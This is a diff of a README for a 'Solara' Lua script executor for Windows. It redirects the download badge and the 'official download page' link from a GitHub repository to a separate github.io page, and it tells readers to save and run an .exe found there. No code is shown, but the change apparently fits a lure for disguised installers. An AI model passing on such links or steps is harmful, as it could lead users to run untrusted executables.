@@ -1,6 +1,6 @@
 # ⚡ solara-executor-update-2026 - Run Lua scripts on Windows easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/yourne6190/solara-executor-update-2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://yourne6190.github.io)
 
 ## 📁 About the software
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards to run the software:
 
 ## 📥 How to download and install
 
-1.  Visit the [official download page](https://github.com/yourne6190/solara-executor-update-2026) to obtain the latest installer.
+1.  Visit the [official download page](https://yourne6190.github.io) to obtain the latest installer.
 2.  Locate the file ending in .exe in the list.
 3.  Click the file to save it to your computer.
 4.  Move the file to a folder you can access easily, such as your Desktop or Downloads folder.
